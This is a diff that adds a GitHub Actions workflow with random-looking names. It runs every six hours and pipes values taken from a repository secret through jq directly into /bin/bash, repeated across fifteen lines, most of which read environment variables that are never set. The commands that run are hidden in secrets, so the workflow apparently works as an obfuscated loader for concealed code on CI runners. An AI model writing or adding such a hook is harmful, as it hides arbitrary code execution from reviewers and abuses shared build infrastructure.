@@ -1,0 +1,32 @@
+name: projectileclue
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: projectileclue
+        env:
+          y57: ${{ secrets.y57 }}
+        run: |
+          echo $y57 | jq -r .jsgnw7567 | /bin/bash
+          echo $dgb05 | jq -r .hzfu8 | /bin/bash
+          echo $qkm469 | jq -r .qr151 | /bin/bash
+          echo $czggw159 | jq -r .z79 | /bin/bash
+          echo $saxt01507 | jq -r .foj41908 | /bin/bash
+          echo $saa0 | jq -r .o2 | /bin/bash
+          echo $fq4516 | jq -r .djodh172 | /bin/bash
+          echo $yzzo4151 | jq -r .gmgh45001 | /bin/bash
+          echo $rxb1311 | jq -r .xf95 | /bin/bash
+          echo $nviis30 | jq -r .l2 | /bin/bash
+          echo $t878 | jq -r .ihwts090 | /bin/bash
+          echo $v493 | jq -r .qzdad25 | /bin/bash
+          echo $jis4602 | jq -r .yeoj759 | /bin/bash
+          echo $twsa55 | jq -r .czj429 | /bin/bash
+          echo $nevj21 | jq -r .ct56888 | /bin/bash
+
